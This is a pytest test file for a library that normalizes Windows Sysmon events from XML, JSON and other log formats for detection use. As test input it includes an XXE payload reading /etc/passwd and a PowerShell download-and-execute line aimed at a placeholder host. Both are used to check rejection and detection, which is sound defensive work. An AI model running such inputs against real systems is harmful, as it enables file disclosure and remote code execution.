import json
import pytest
from deepsnout.normalize import (normalize,parse_payload,InvalidEvent,UnsupportedEvent,location,command_features,timestamp)
from conftest import raw_event,CLOCK

XML = '''<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>
<TimeCreated SystemTime="2026-09-10T10:30:00.000Z"/><Computer>WS-001.EXAMPLE.</Computer>
<EventRecordID>42</EventRecordID></System><EventData>
<Data Name="ProcessGuid">{00000000-0000-0000-0000-000000000001}</Data>
<Data Name="Image">C:\\Users\\alice\\Downloads\\tool.exe</Data>
<Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
<Data Name="CommandLine">tool.exe --password SECRET-WILL-NOT-BE-STORED</Data>
</EventData></Event>'''


def test_xml_identity_and_privacy():
    e=normalize({"_raw":XML,"host":"collector","index":"wef","_time":1})
    assert e.host=="ws-001.example" and e.ts==timestamp("2026-09-10T10:30:00Z")
    assert e.location=="downloads" and e.parent=="explorer.exe"
    assert "alice" not in e.image and "SECRET" not in json.dumps(e.to_dict())
    assert e.pointer["index"]=="wef"


@pytest.mark.parametrize("wrapper",[lambda x:x,lambda x:{"result":x},lambda x:{"_raw":json.dumps(x)}])
def test_json_wrappers(wrapper):
    assert normalize(wrapper(raw_event())).app=="utility.exe"


def test_nested_eventdata():
    e=normalize({"Event":{"System":{"EventID":{"#text":"22"},"Computer":"w1",
        "Provider":{"@Name":"Microsoft-Windows-Sysmon"},"TimeCreated":{"@SystemTime":"2026-09-10T12:00:00Z"}},
        "EventData":{"Data":[{"@Name":"QueryName","#text":"EXAMPLE.COM."}]}}})
    assert e.query=="example.com" and not e.guid


def test_elastic_shape_not_a_transport():
    e=normalize({"@timestamp":"2026-09-10T12:00:00Z","winlog":{"event_id":3,
        "computer_name":"w1","provider_name":"Microsoft-Windows-Sysmon",
        "event_data":{"DestinationIp":"2001:4860:4860::8888","DestinationPort":53,"Initiated":"true"}}})
    assert e.port==53 and e.initiated is True


def test_rendered_english():
    e=normalize("EventCode=3\nComputer=ws1\nUtcTime: 2026-09-10 10:30:00.000\nDestinationIp: 8.8.8.8\nDestinationPort: 443\nInitiated: true\nImage: C:\\Windows\\test.exe")
    assert e.event_id==3 and e.app=="test.exe"


@pytest.mark.parametrize("payload",["",b"\xff\xff",'<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><Event>&e;</Event>'])
def test_unsafe_invalid_input(payload):
    with pytest.raises(InvalidEvent): parse_payload(payload)


def test_mixed_invalid_and_unsupported():
    events,report=parse_payload(json.dumps([raw_event(),raw_event(7),{"EventID":3}]))
    assert len(events)==1 and report["invalid"]==1 and report["ignored"]==1


def test_xml_collection_and_limit():
    assert len(parse_payload("<Events>"+XML*2+"</Events>")[0])==2
    with pytest.raises(InvalidEvent): parse_payload("<Events>"+XML*2+"</Events>",maximum=1)


def test_ndjson_and_results():
    for text in [json.dumps(raw_event())+"\n"+json.dumps(raw_event(n=2)),
                 json.dumps({"results":[raw_event(),raw_event(n=2)]})]:
        assert len(parse_payload(text)[0])==2


def test_guids_and_time_and_provider():
    e=normalize(raw_event(ProcessGuid="bad",ParentProcessGuid="bad"))
    assert not e.guid and not e.parent_guid and e.warnings
    with pytest.raises(InvalidEvent): normalize({**raw_event(),"UtcTime":""})
    with pytest.raises(UnsupportedEvent): normalize(raw_event(Provider="Microsoft-Windows-Security-Auditing"))


def test_domain_not_truncated():
    with pytest.raises(InvalidEvent): normalize(raw_event(22,QueryName="a"*260+".com"))


def test_ids_reset_and_collectors_do_not_define_event():
    a=normalize({**raw_event(),"EventRecordID":3,"host":"collector1"})
    b=normalize({**raw_event(),"EventRecordID":3,"host":"collector2","_indextime":10})
    c=normalize({**raw_event(ts=CLOCK-600),"EventRecordID":3})
    assert a.id==b.id and a.id!=c.id


def test_source_port_affects_receipt_not_context():
    assert normalize(raw_event(3,SourcePort="30000")).id!=normalize(raw_event(3,SourcePort="30001")).id


@pytest.mark.parametrize("value,expected",[(r"\\server\share\app.exe","network-share"),
    (r"C:\Users\joe\AppData\Local\Temp\x.exe","temporary"),(r"C:\Windows\x.exe","windows")])
def test_locations(value,expected):
    assert location(value)==expected


def test_command_flags():
    f=command_features('IEX (Invoke-WebRequest https://example.invalid/a)','powershell.exe')
    assert f['execution_primitive'] and f['remote_reference'] and f['download_primitive']
    assert not command_features('powershell -NoProfile -File maintenance.ps1','powershell.exe')['execution_primitive']


def test_nested_json_fails_safely():
    with pytest.raises(InvalidEvent): parse_payload('['*2000+'0'+']'*2000)


@pytest.mark.parametrize("payload", ['[' * 65 + '0' + ']' * 65,
                                     '{"result":' * 65 + '0' + '}' * 65])
def test_explicit_json_nesting_limit(payload):
    with pytest.raises(InvalidEvent, match="nesting"):
        parse_payload(payload)


def test_nesting_limit_ignores_brackets_inside_strings():
    record = raw_event(CommandLine='utility.exe "' + '[' * 200 + '\\"' + ']' * 200)
    events, report = parse_payload(json.dumps(record))
    assert len(events) == 1 and report["invalid"] == 0


def test_embedded_raw_json_nesting_limit():
    with pytest.raises(InvalidEvent, match="nesting"):
        normalize({"_raw": '{"result":' * 65 + '0' + '}' * 65})


def test_cribl_named_data_json():
    raw={"Event":{"System":{"Provider":{"Name":"Microsoft-Windows-Sysmon"},"EventID":"3",
        "TimeCreated":{"SystemTime":"2026-09-14T10:00:00Z"},"Computer":"WS1.DOMAIN.LOCAL"},
        "EventData":{"Data":[{"Name":"ProcessGuid","_value":"{00000000-0000-0000-0000-000000000001}"},
        {"Name":"Image","_value":r"C:\Windows\curl.exe"},{"Name":"DestinationIp","_value":"8.8.8.8"},
        {"Name":"DestinationPort","_value":"443"},{"Name":"Initiated","_value":"true"}]}}}
    e=normalize({"_raw":json.dumps(raw),"host":"collector"},"json")
    assert e.host=="ws1.domain.local" and e.event_id==3 and e.port==443 and e.initiated is True


def test_cribl_flattened_dotted_json():
    raw={"Event.System.Provider.Name":"Microsoft-Windows-Sysmon","Event.System.EventID":"22",
        "Event.System.TimeCreated.SystemTime":"2026-09-14T10:00:00Z","Event.System.Computer":"WS2.DOMAIN.LOCAL",
        "Event.EventData.QueryName":"Example.COM."}
    e=normalize({"_raw":json.dumps(raw),"host":"collector"},"json")
    assert e.host=="ws2.domain.local" and e.query=="example.com"


def test_cribl_windows_json_message_and_dotnet_time():
    raw={"Id":3,"RecordId":44,"ProviderName":"Microsoft-Windows-Sysmon","MachineName":"WS3.DOMAIN.LOCAL",
        "TimeCreated":"/Date(1789380000000)/","Message":"Network connection detected:\nUtcTime: 2026-09-14 10:00:00.000\nProcessGuid: {00000000-0000-0000-0000-000000000001}\nImage: C:\\Windows\\x.exe\nDestinationIp: 8.8.4.4\nDestinationPort: 443\nProtocol: tcp\nInitiated: true"}
    e=normalize({"_raw":json.dumps(raw)},"json")
    assert e.host=="ws3.domain.local" and e.event_id==3 and e.destination=="8.8.4.4" and e.port==443


def test_cribl_win_event_fallback():
    raw={"Id":22,"ProviderName":"Microsoft-Windows-Sysmon","MachineName":"WS4","TimeCreated":"2026-09-14T10:00:00Z",
        "__winEvent":{"Event":{"System":{"EventID":22,"Computer":"WS4","Provider":{"Name":"Microsoft-Windows-Sysmon"},
        "TimeCreated":{"SystemTime":"2026-09-14T10:00:00Z"}},"EventData":{"QueryName":"Example.org"}}}}
    e=normalize({"_raw":json.dumps(raw)},"json")
    assert e.host=="ws4" and e.query=="example.org"


def test_cribl_flat_top_level_task_fallback_from_real_shape():
    raw={"sourceMachineID":"Computer1.domain.local","Name":"'Microsoft-Windows-Sysmon'",
        "Guid":"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","Version":"5","Level":"4","Task":"1",
        "Opcode":"0","Keywords":"0x8000000000000000","SystemTime":"'2026-09-14T11:57:36.2358960Z'",
        "EventRecordID":"342444","ProcessID":"'20384'","ThreadID":"'19008'",
        "Channel":"Microsoft-Windows-Sysmon/Operational","UserID":"S-1-5-18","RuleName":"-",
        "UtcTime":"2026-09-14 11:57:36.233","ProcessGuid":"{895d25f3-e130-6aa7-c73d-000000001800}",
        "ProcessId":"14588","Image":r"C:\Windows\System32\smartscreen.exe",
        "CommandLine":r"C:\Windows\System32\smartscreen.exe -Embedding",
        "Hashes":"MD5=8C82BDA3ED4D8963EF65D91A0CECCBC1,SHA256=2AF496C24C1DEF94006DA19E6E5940715067BA8AFD482FE4C7C944E882EC43A3",
        "ParentProcessGuid":"{895d25f3-b8c3-6a97-0f00-000000001800}","ParentProcessId":"1360",
        "ParentImage":r"C:\Windows\System32\svchost.exe"}
    e=normalize({"_raw":json.dumps(raw),"host":"collector"},"json")
    assert e.event_id==1 and e.host=="computer1.domain.local" and e.app=="smartscreen.exe"
    assert e.sha256=="2af496c24c1def94006da19e6e5940715067ba8afd482fe4c7c944e882ec43a3"
    assert any("inferred from Sysmon Task" in warning for warning in e.warnings)


@pytest.mark.parametrize("task,fields",[(3,{"DestinationIp":"8.8.8.8","DestinationPort":"443","Initiated":"true"}),
                                         (22,{"QueryName":"Example.org"})])
def test_cribl_task_fallback_for_supported_sysmon_types(task,fields):
    raw={"sourceMachineID":"ws.example","Name":"'Microsoft-Windows-Sysmon'","Task":str(task),
         "Channel":"Microsoft-Windows-Sysmon/Operational","UtcTime":"2026-09-14 11:57:36.233",
         "ProcessGuid":"{00000000-0000-0000-0000-000000000001}","Image":r"C:\Windows\x.exe",**fields}
    e=normalize({"_raw":json.dumps(raw)},"json")
    assert e.event_id==task and e.host=="ws.example"


def test_explicit_event_format_rejects_switch():
    with pytest.raises(InvalidEvent,match="Configured JSON"):
        normalize({"_raw":XML},"json")
    with pytest.raises(InvalidEvent,match="Configured XML"):
        normalize({"_raw":json.dumps(raw_event())},"xml")
